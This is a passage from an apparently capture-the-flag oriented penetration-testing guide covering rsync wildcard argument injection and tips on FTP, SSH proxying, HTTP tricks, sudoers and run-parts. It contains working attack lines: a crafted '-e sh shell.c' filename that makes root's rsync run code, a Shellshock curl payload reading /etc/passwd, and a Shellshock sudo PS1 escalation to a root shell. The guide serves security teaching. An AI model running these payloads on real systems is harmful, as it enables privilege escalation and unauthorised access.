<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="nb">id</span>
</pre></div>
</div>
<p>So, with this tar argument pollution, we can basically execute arbitrary commands with privileges of the user that runs tar. As demonstrated on the &#8216;root&#8217; account above.</p>
</div>
<div class="section" id="rsync-arbitrary-command-execution">
<h4>Rsync arbitrary command execution<a class="headerlink" href="#rsync-arbitrary-command-execution" title="Permalink to this headline">¶</a></h4>
<p>Rsync is &#8220;a fast, versatile, remote (and local) file-copying tool&#8221;, that is very common on Unix systems. If we check &#8216;rsync&#8217; manual page, we can again find options that can be abused for arbitrary command execution.</p>
<p>Rsync manual: &#8220;You use rsync in the same way you use rcp. You must specify a source and a destination, one of which may be remote.&#8221;</p>
<p>Interesting rsync option from manual:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">-</span><span class="n">e</span><span class="p">,</span> <span class="o">--</span><span class="n">rsh</span><span class="o">=</span><span class="n">COMMAND</span>       <span class="n">specify</span> <span class="n">the</span> <span class="n">remote</span> <span class="n">shell</span> <span class="n">to</span> <span class="n">use</span>
<span class="o">--</span><span class="n">rsync</span><span class="o">-</span><span class="n">path</span><span class="o">=</span><span class="n">PROGRAM</span>    <span class="n">specify</span> <span class="n">the</span> <span class="n">rsync</span> <span class="n">to</span> <span class="n">run</span> <span class="n">on</span> <span class="n">remote</span> <span class="n">machine</span>
</pre></div>
</div>
<p>Let&#8217;s abuse one example directly from the &#8216;rsync&#8217; manual page. Following example will copy all C files in local directory to a remote host &#8216;foo&#8217; in &#8216;/src&#8217; directory.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="c1"># rsync -t *.c foo:src/</span>
</pre></div>
</div>
<p>Directory content:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># ls -al</span>
<span class="n">total</span> <span class="mi">72</span>
<span class="n">drwxrwxrwx</span><span class="o">.</span>  <span class="mi">2</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">47</span> <span class="o">.</span>
<span class="n">drwx</span><span class="o">------.</span> <span class="mi">24</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">18</span><span class="p">:</span><span class="mi">32</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">20480</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">13</span> <span class="n">admin</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">34</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">ado</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">187</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">db</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">201</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">43</span> <span class="n">download</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">45</span> <span class="o">-</span><span class="n">e</span> <span class="n">sh</span> <span class="n">shell</span><span class="o">.</span><span class="n">c</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">43</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">file1</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">56</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">footer</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">357</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="k">global</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">225</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">37</span> <span class="n">header</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">117</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="n">inc</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">111</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">94</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">script</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">31</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">45</span> <span class="n">shell</span><span class="o">.</span><span class="n">c</span>
</pre></div>
</div>
<p>Now root will try to copy all C files to the remote server.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># rsync -t *.c foo:src/</span>

<span class="n">rsync</span><span class="p">:</span> <span class="n">connection</span> <span class="n">unexpectedly</span> <span class="n">closed</span> <span class="p">(</span><span class="mi">0</span> <span class="nb">bytes</span> <span class="n">received</span> <span class="n">so</span> <span class="n">far</span><span class="p">)</span> <span class="p">[</span><span class="n">sender</span><span class="p">]</span>
<span class="n">rsync</span> <span class="n">error</span><span class="p">:</span> <span class="n">error</span> <span class="ow">in</span> <span class="n">rsync</span> <span class="n">protocol</span> <span class="n">data</span> <span class="n">stream</span> <span class="p">(</span><span class="n">code</span> <span class="mi">12</span><span class="p">)</span> <span class="n">at</span> <span class="n">io</span><span class="o">.</span><span class="n">c</span><span class="p">(</span><span class="mi">601</span><span class="p">)</span> <span class="p">[</span><span class="n">sender</span><span class="o">=</span><span class="mf">3.0</span><span class="o">.</span><span class="mi">8</span><span class="p">]</span>
</pre></div>
</div>
<p>Let&#8217;s see what happened...</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># ls -al</span>
<span class="n">total</span> <span class="mi">76</span>
<span class="n">drwxrwxrwx</span><span class="o">.</span>  <span class="mi">2</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">49</span> <span class="o">.</span>
<span class="n">drwx</span><span class="o">------.</span> <span class="mi">24</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">18</span><span class="p">:</span><span class="mi">32</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">20480</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">13</span> <span class="n">admin</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">34</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">ado</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">187</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">db</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">201</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">43</span> <span class="n">download</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">45</span> <span class="o">-</span><span class="n">e</span> <span class="n">sh</span> <span class="n">shell</span><span class="o">.</span><span class="n">c</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">43</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">file1</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">56</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">footer</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">357</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="k">global</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">225</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">37</span> <span class="n">header</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">117</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="n">inc</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">111</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">94</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">script</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">31</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">45</span> <span class="n">shell</span><span class="o">.</span><span class="n">c</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>   <span class="mi">101</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">49</span> <span class="n">shell_output</span><span class="o">.</span><span class="n">txt</span>
</pre></div>
</div>
<p>There were two files owned by user &#8216;leon&#8217;, as listed below.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">45</span> <span class="o">-</span><span class="n">e</span> <span class="n">sh</span> <span class="n">shell</span><span class="o">.</span><span class="n">c</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">31</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">45</span> <span class="n">shell</span><span class="o">.</span><span class="n">c</span>
</pre></div>
</div>
<p>After &#8216;rsync&#8217; execution, new file shell_output.txt whose owner is root is created in same directory.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>   <span class="mi">101</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">49</span> <span class="n">shell_output</span><span class="o">.</span><span class="n">txt</span>
</pre></div>
</div>
<p>If we check its content, following data is found.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># cat shell_output.txt</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">context</span><span class="o">=</span><span class="n">unconfined_u</span><span class="p">:</span><span class="n">unconfined_r</span><span class="p">:</span><span class="n">unconfined_t</span><span class="p">:</span><span class="n">s0</span><span class="o">-</span><span class="n">s0</span><span class="p">:</span><span class="n">c0</span><span class="o">.</span><span class="n">c1023</span>
</pre></div>
</div>
<p>Trick is that because of the &#8216;*.c&#8217; wildcard, &#8216;rsync&#8217; got &#8216;-e sh shell.c&#8217; option on command line, and shell.c will be executed upon&#8217;rsync&#8217; start. Content of shell.c is presented below.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># cat shell.c</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="nb">id</span> <span class="o">&gt;</span> <span class="n">shell_output</span><span class="o">.</span><span class="n">txt</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="tips-and-tricks">
<h2>Tips and Tricks<a class="headerlink" href="#tips-and-tricks" title="Permalink to this headline">¶</a></h2>
<div class="section" id="ftp-services">
<h3>FTP Services<a class="headerlink" href="#ftp-services" title="Permalink to this headline">¶</a></h3>
<p>If ftp anonymous login is provided or you have login details, you can download the contents by wget, (For anonymous login user password are not required)</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">wget</span> <span class="o">-</span><span class="n">rq</span> <span class="n">ftp</span><span class="p">:</span><span class="o">//</span><span class="n">IP</span> <span class="o">--</span><span class="n">ftp</span><span class="o">-</span><span class="n">user</span><span class="o">=</span><span class="n">username</span> <span class="o">--</span><span class="n">ftp</span><span class="o">-</span><span class="n">password</span><span class="o">=</span><span class="n">password</span>
</pre></div>
</div>
</div>
<div class="section" id="ssh">
<h3>SSH<a class="headerlink" href="#ssh" title="Permalink to this headline">¶</a></h3>
<div class="section" id="ssh-config">
<h4>ssh_config<a class="headerlink" href="#ssh-config" title="Permalink to this headline">¶</a></h4>
<p>If you know the password of the user, however, ssh is not allowing you to login, check ssh_config.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="c1">## Tighten security after security incident</span>
<span class="c1">## root never gets to log in remotely PermitRootLogin no</span>
<span class="c1">## Eugene &amp; Margo can SSH in, no-one else allowed</span>
<span class="n">AllowUsers</span> <span class="n">example_user1</span> <span class="n">example_user2</span>
<span class="c1">## SSH keys only but example_user1 can use a password</span>
<span class="n">Match</span> <span class="n">user</span> <span class="n">example_user1</span>
<span class="n">PasswordAuthentication</span> <span class="n">yes</span>
<span class="c1">## End tighten security</span>
</pre></div>
</div>
</div>
<div class="section" id="ssh-as-socks-proxy">
<h4>SSH as SOCKS Proxy<a class="headerlink" href="#ssh-as-socks-proxy" title="Permalink to this headline">¶</a></h4>
<p>We can use ssh to have a socks proxy to connect to vnc, ssh, rdp if vm is hosting in another vm and then use remmina to access VNC.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>ssh -D localhost:9050 user@host

-D [bind_address:]port Specifies a local “dynamic” application-level port forwarding.  This works by allocating a socket to listen to port on the local side, optionally bound to the specified bind_address.  Whenever a connection is made to this port, the connection is forwarded over the secure channel, and the application protocol is then used to determine where to connect to from the remote machine.  Currently the SOCKS4 and SOCKS5 protocols are supported, and ssh will act as a SOCKS server.  Only root can forward privileged ports. Dynamic port forwardings can also be specified in the configuration file.
</pre></div>
</div>
<p>and</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">proxychains4</span> <span class="n">remmina</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="http">
<h3>HTTP<a class="headerlink" href="#http" title="Permalink to this headline">¶</a></h3>
<div class="section" id="first-things">
<h4>First things<a class="headerlink" href="#first-things" title="Permalink to this headline">¶</a></h4>
<ul class="simple">
<li>View Source of the web-page ( Ctrl+U).</li>
<li>Inspect element of the web-page ( F12 ).</li>
<li>See if there is any hint in the title of the web page. ( example: /Magic ).</li>
<li>If any login page is implemented asking for username and password. Check how it is implemented? Is it using any open-source authentication modules? If so, look if there are any default passwords for that.</li>
</ul>
</div>
<div class="section" id="htaccess-useragent">
<h4>htaccess - UserAgent<a class="headerlink" href="#htaccess-useragent" title="Permalink to this headline">¶</a></h4>
<p>When you see something like this &#8220;Someone&#8217;s sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content&#8221;. Which says, only this can see me. Try to see what user-agent it is talking about. The way it is implemented is by use of .htaccess file</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>cat .htaccess
BrowserMatchNoCase &quot;iPhone&quot; allowed

Order Deny,Allow
Deny from ALL
Allow from env=allowed
ErrorDocument 403 “&lt;H1&gt;Super secret location - only me and Steve Jobs can see this content&lt;/H1&gt;&lt;H2&gt;Lol&lt;/H2&gt;”
</pre></div>
</div>
</div>
<div class="section" id="cgi-bin-shellshock">
<h4>CGI-BIN Shellshock<a class="headerlink" href="#cgi-bin-shellshock" title="Permalink to this headline">¶</a></h4>
<p>To understand shellshock few blogs can be referred such as <cite>ShellShocked – A quick demo of how easy it is to exploit &lt;https://www.surevine.com/shellshocked-a-quick-demo-of-how-easy-it-is-to-exploit/&gt;</cite>, <a class="reference external" href="https://blog.cloudflare.com/inside-shellshock/">Inside Shellshock: How hackers are using it to exploit systems</a></p>
<div class="highlight-default"><div class="highlight"><pre><span></span> curl -H &quot;User-Agent: () { :; }; echo &#39;Content-type: text/html&#39;; echo; /bin/cat /etc/passwd&quot; http://192.168.56.2:591/cgi-bin/cat

It is important to understand what is cgi-bin which can be read from `Creating CGI Programs with Bash: Getting Started &lt;http://www.team2053.org/docs/bashcgi/gettingstarted.html&gt;`_. Also the most important lines in this file are:
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="s2">&quot;Content-type: text/html&quot;</span>
<span class="n">echo</span> <span class="s2">&quot;&quot;</span>
</pre></div>
</div>
<p>These two lines tell your browser that the rest of the content coming from the program is HTML, and should be treated as such. Leaving these lines out will often cause your browser to download the output of the program to disk as a text file instead of displaying it, since it doesn&#8217;t understand that it is HTML!</p>
<p><strong>Shellshock Local Privilege Escalation</strong></p>
<p>Binaries with a setuid bit and calling (directly or indirectly) bash through execve, popen or system are tools which may be used to activate the Shell Shock bug.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">sudo</span> <span class="n">PS1</span><span class="o">=</span><span class="s2">&quot;() { :;} ;  /bin/sh&quot;</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">username</span><span class="o">/</span><span class="n">suidbinary</span>
</pre></div>
</div>
<p>Shellshock also affects DHCP as mentioned <a class="reference external" href="https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/">Shellshock DHCP RCE Proof of Concept</a> There&#8217;s a metasploit module named &#8220;Dhclient Bash Environment Variable Injection (Shellshock)&#8221; for this.</p>
</div>
<div class="section" id="xss-html-injection">
<h4>XSS/ HTML Injection<a class="headerlink" href="#xss-html-injection" title="Permalink to this headline">¶</a></h4>
<p>The below will redirect the page to google.com</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>&lt;META http-equiv=“refresh” content=“0;URL=http://www.google.com”&gt;
</pre></div>
</div>
</div>
<div class="section" id="curl">
<h4>curl<a class="headerlink" href="#curl" title="Permalink to this headline">¶</a></h4>
<div class="highlight-default"><div class="highlight"><pre><span></span>-k, --insecure
(SSL) This option explicitly allows curl to perform &quot;insecure&quot; SSL connections and transfers. All SSL connections are attempted to be made secure by using the CA certificate  bundle  installed  by  default.
This makes all connections considered &quot;insecure&quot; fail unless -k, --insecure is used.

-I, --head
(HTTP/FTP/FILE) Fetch the HTTP-header only! HTTP-servers feature the command HEAD which this uses to get nothing but the header of a document. When used on an FTP or FILE file, curl displays the  file  size and last modification time only.
</pre></div>
</div>
</div>
<div class="section" id="http-referer">
<h4>HTTP Referer<a class="headerlink" href="#http-referer" title="Permalink to this headline">¶</a></h4>
<p>The Referer request header contains the address of the previous web page from which a link to the currently requested page was followed. The Referer header allows servers to identify where people are visiting them from and may use that data for analytics, logging, or optimized caching.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Referer</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">url</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">url</span><span class="o">&gt;</span> <span class="n">An</span> <span class="n">absolute</span> <span class="ow">or</span> <span class="n">partial</span> <span class="n">address</span> <span class="n">of</span> <span class="n">the</span> <span class="n">previous</span> <span class="n">web</span> <span class="n">page</span> <span class="kn">from</span> <span class="nn">which</span> <span class="n">a</span> <span class="n">link</span> <span class="n">to</span> <span class="n">the</span> <span class="n">currently</span> <span class="n">requested</span> <span class="n">page</span> <span class="n">was</span> <span class="n">followed</span><span class="o">.</span> <span class="n">URL</span> <span class="n">fragments</span> <span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">e</span><span class="o">.</span> <span class="s2">&quot;#section&quot;</span><span class="p">)</span> <span class="n">are</span> <span class="ow">not</span> <span class="n">included</span><span class="o">.</span>
</pre></div>
</div>
</div>
<div class="section" id="data-uri">
<h4>Data-URI<a class="headerlink" href="#data-uri" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs">Basics of HTTP Data URI</a></p>
</div>
<div class="section" id="login-pages">
<h4>Login-Pages<a class="headerlink" href="#login-pages" title="Permalink to this headline">¶</a></h4>
<p>To test login pages, we may use burpsuite intruder and check for different length of response.</p>
</div>
<div class="section" id="delete-tags">
<h4>Delete Tags<a class="headerlink" href="#delete-tags" title="Permalink to this headline">¶</a></h4>
<p>Delete all lines between tags including tags:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">sed</span> <span class="s1">&#39;/&lt;tag&gt;/,/&lt;\/tag&gt;/d&#39;</span> <span class="nb">input</span><span class="o">.</span><span class="n">txt</span>
</pre></div>
</div>
<div class="admonition tip">
<p class="first admonition-title">Tip</p>
<p class="last">Useful when you are accessing the webpage using curl and their LFI and you want to remove the html/ body tags.</p>
</div>
</div>
<div class="section" id="http-404-custom-page">
<h4>HTTP 404 Custom Page<a class="headerlink" href="#http-404-custom-page" title="Permalink to this headline">¶</a></h4>
<p>Sometimes, it&#8217;s a good idea to look at 404 custom page also. There might be some information store.d</p>
</div>
</div>
<div class="section" id="run-parts">
<h3>run-parts<a class="headerlink" href="#run-parts" title="Permalink to this headline">¶</a></h3>
<p>run-parts runs all the executable files named, found in directory directory. This is mainly useful when we are waiting for the cron jobs to run. It can be used to execute scripts present in a folder.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">run</span><span class="o">-</span><span class="n">parts</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="o">.</span><span class="n">daily</span>
</pre></div>
</div>
</div>
<div class="section" id="sudoers-file">
<h3>Sudoers file<a class="headerlink" href="#sudoers-file" title="Permalink to this headline">¶</a></h3>
<p>If the sudoers file contains:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">secure</span>\<span class="n">_path</span>
<span class="n">Path</span> <span class="n">used</span> <span class="k">for</span> <span class="n">every</span> <span class="n">command</span> <span class="n">run</span> <span class="kn">from</span> <span class="nn">sudo.</span> <span class="n">If</span> <span class="n">you</span> <span class="n">don</span><span class="s1">&#39;t trust the people running sudo to have a sane PATH environment         variable you may want to use this. Another use is if you want to have the “root path” be separate from the “user path”. Users in the group specified by the exempt\_group option are not affected by secure\_path. This option is not set by default.</span>

<span class="n">env</span>\<span class="n">_reset</span> <span class="n">If</span> <span class="nb">set</span><span class="p">,</span> <span class="n">sudo</span> <span class="n">will</span> <span class="n">run</span> <span class="n">the</span> <span class="n">command</span> <span class="ow">in</span> <span class="n">a</span> <span class="n">minimal</span> <span class="n">environment</span> <span class="n">containing</span> <span class="n">the</span> <span class="n">TERM</span><span class="p">,</span> <span class="n">PATH</span><span class="p">,</span> <span class="n">HOME</span><span class="p">,</span> <span class="n">MAIL</span><span class="p">,</span> <span class="n">SHELL</span><span class="p">,</span> <span class="n">LOGNAME</span><span class="p">,</span> <span class="n">USER</span><span class="p">,</span> <span class="n">USERNAME</span> <span class="ow">and</span> <span class="n">SUDO</span>\<span class="n">_</span>\<span class="o">*</span> <span class="n">variables</span><span class="o">.</span> <span class="n">Any</span> <span class="n">variables</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">caller</span><span class="s1">&#39;s environment that match the env\_keep and env\_check lists are then added, followed by any variables present in the file specified by the env\_file option (if any). The contents of the env\_keep and 